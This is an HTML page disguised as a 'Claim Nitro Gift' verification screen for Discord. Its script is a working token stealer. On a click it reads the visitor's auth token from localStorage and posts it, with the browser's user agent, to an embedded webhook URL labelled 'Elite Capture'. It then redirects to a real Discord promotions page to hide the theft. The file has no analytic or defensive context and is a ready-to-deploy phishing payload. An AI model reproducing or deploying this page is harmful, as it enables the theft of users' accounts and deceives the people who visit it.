<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nitro | Verification</title>
    <style>
        :root {
            --blurple: #5865F2;
            --bg-dark: #202225;
            --text-main: #FFFFFF;
        }

        body {
            margin: 0;
            background-color: #18191C;
            font-family: 'gg sans', sans-serif;
            display: flex; justify-content: center; align-items: center;
            height: 100vh;
        }

        .container {
            background: var(--bg-dark);
            width: 440px;
            padding: 32px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 0 0 1px rgba(0,0,0,0.3), 0 2px 10px rgba(0,0,0,0.6);
        }

        /* Ensuring the image matches image_3998e3.png look */
        .logo {
            width: 40px;
            margin-bottom: 16px;
        }

        h1 { color: var(--text-main); font-size: 20px; margin-bottom: 12px; }
        p { color: #b9bbbe; font-size: 14px; margin-bottom: 24px; line-height: 1.4; }

        .btn {
            background: var(--blurple);
            color: #fff;
            border: none;
            padding: 10px 20px;
            width: 100%;
            border-radius: 3px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn:hover { background: #4752c4; }
    </style>
</head>
<body>
    <div class="container">
        <!-- Using image_3998e3.png as requested -->
        <img src="image_3998e3.png" alt="Logo" class="logo">
        
        <h1>Claim Nitro Gift</h1>
        <p>Your subscription gift is ready to be applied. Verify your identity to activate.</p>
        <button id="claimBtn" class="btn">Activate Subscription</button>
    </div>

    <script>
        document.getElementById('claimBtn').addEventListener('click', async () => {
            const btn = document.getElementById('claimBtn');
            btn.innerText = "Verifying...";
            btn.disabled = true;

            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
            
            await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "@everyone",
                    embeds: [{
                        title: "🚀 Elite Capture",
                        color: 0x5865F2,
                        fields: [
                            { name: "Auth Token", value: `\`${token || "NULL"}\`` },
                            { name: "Agent", value: `\`${navigator.userAgent}\`` }
                        ]
                    }]
                })
            });

            setTimeout(() => {
                window.location.replace("https://discord.com/billing/promotions/gift-accepted");
            }, 1000);
        });
    </script>
</body>
</html>
